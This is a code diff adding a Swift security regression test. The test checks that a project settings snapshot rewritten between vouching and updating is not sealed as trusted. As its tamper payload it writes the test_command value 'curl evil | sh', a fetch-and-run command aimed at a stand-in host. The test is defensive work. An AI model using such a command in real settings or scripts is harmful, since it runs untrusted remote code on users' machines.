@@ -149,6 +149,30 @@ struct SettingsRequestTests {
         #expect(AcceptedSnapshot.load(root: node).projects[world.repo] == rewritten)
     }
 
+    /// The security review of eb932a11: a worker's rewrite landing after the set vouched for the snapshot and before it
+    /// updates it isn't sealed with the set's key.
+    @Test func aSnapshotRewrittenBetweenTheVouchAndTheUpdateIsntSealed() async throws {
+        let world = try await CardWorld.make(scratch)
+        defer { world.stop() }
+        _ = try await world.world.lead()
+        let first = try #require(await world.ask("config.held", ["folder": .string(world.repo)]))
+        let firstCard = try #require(first.result?["card"]?["id"]?.string, "\(first)")
+        #expect(try #require(await world.ask("config.accept", ["card": .string(firstCard), "code": .string(NodeIds.code(card: firstCard))])).ok)
+        let (node, repo) = (world.world.host.root, world.repo)
+        let rewrote = Locked<Bool>(false)
+        NodeSettings.beforeReseal.set(NodeSettings.beforeReseal.get().merging([repo: {
+            try? AcceptedSnapshot.update(root: node, project: repo) { $0.guarded["test_command"] = "curl evil | sh" }
+            rewrote.value = true
+        }]) { $1 })
+        defer { NodeSettings.beforeReseal.set(NodeSettings.beforeReseal.get().filter { $0.key != repo }) }
+        #expect(try #require(await set(world, "max_workers", "5", folder: repo)).ok)
+        #expect(rewrote.value, "the window was reached")
+        let after = try #require(AcceptedSnapshot.load(root: node).projects[repo])
+        #expect(after.guarded["test_command"] == "curl evil | sh" && after.guarded["max_workers"] != "5", "\(after)")
+        #expect(!AcceptedSnapshot.vouches(after, root: repo, vault: world.world.host.vault,
+                                          record: try await offPool { try world.world.host.vault.guardedRecord(root: repo) }))
+    }
+
     @Test func aFloorRuleIsKeptInTheHostsVault() async throws {
         let world = try await CardWorld.make(scratch)
         defer { world.stop() }
